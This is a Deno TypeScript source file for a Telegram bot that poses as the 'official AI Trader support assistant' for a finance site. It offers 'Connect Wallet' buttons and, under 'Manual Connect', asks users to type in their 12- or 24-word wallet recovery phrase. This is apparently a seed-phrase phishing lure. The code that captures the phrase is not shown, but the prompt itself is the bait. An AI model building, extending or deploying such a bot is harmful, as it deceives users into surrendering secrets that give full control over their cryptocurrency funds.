import { Bot, InlineKeyboard } from "./deps.deno.ts";

export const bot = new Bot(Deno.env.get("BOT_TOKEN") || "");

// Construct a keyboard.
const inlineKeyboard = new InlineKeyboard().text("Connect Wallet", "click-payload");

// Build an inline keyboard:
const homeKeyboard = new InlineKeyboard()
  .text('Connect Wallet', 'connect').row()
  .url('official Website', 'https://ait.finance')

// Build an inline keyboard:
const connectKeyboard = new InlineKeyboard()
  .text('Manual Connect', 'manualConnect').row()
  .url('Web Connect', 'https://ait.finance')

// Send a keyboard along with a message.
bot.command("start", async (ctx) => {
  await ctx.reply("Welcome to official AI Trader support assistant!", { reply_markup: homeKeyboard });
});

// Wait for click events with specific callback data.
bot.callbackQuery("connect", async (ctx) => {
  ctx.deleteMessage()
  await ctx.reply("Connect your wallet", { reply_markup: connectKeyboard });
  // await ctx.answerCallbackQuery({
  //   text: "Manual Connect",
  // });
});

// Wait for click events with specific callback data.
bot.callbackQuery("manualConnect", async (ctx) => {
  ctx.deleteMessage()
  await ctx.reply("Enter your wallet phrase (usually 12 or 24 words) to import manually");
  // await ctx.answerCallbackQuery({
  //   text: "Manual Connect",
  // });
});

bot.command("ping", (ctx) => ctx.reply(`Pong! ${new Date()} ${Date.now()}`));
